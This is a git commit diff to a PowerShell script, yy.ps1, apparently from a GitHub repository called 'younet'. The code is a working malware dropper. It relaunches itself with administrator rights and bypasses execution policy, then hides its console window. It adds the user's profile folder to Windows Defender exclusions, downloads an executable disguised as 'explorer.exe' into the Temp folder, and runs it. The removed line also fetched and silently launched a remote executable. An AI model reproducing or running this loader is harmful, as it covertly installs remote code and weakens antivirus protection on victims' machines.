922748745ea3d48bf1a29252be055caf6902eedc
Aevagee <108525058+Aevagee@users.noreply.github.com>
2024-10-12 04:32:08 +0300

    Update yy.ps1

--- yy.ps1
+++ yy.ps1
@@ -1,1 +1,23 @@
-$e="$env:TMP\file.exe"; iwr "https://github.com/Aevagee/younet/raw/refs/heads/main/yy.exe" -OutFile $e; Start-Process $e -WindowStyle Hidden; Remove-Item $e
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
+    exit;
+}
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+function Hide-Console
+{
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+}
+Hide-Console
+Add-MpPreference -ExclusionPath $env:USERPROFILE
+$url = 'https://github.com/Aevagee/younet/raw/refs/heads/main/explorer.exe'
+$outputFile = [System.IO.Path]::Combine($env:Temp, 'explorer.exe')
+Start-Sleep -Milliseconds 100 
+Invoke-WebRequest -Uri $url -OutFile $outputFile
+Start-Process -FilePath $outputFile
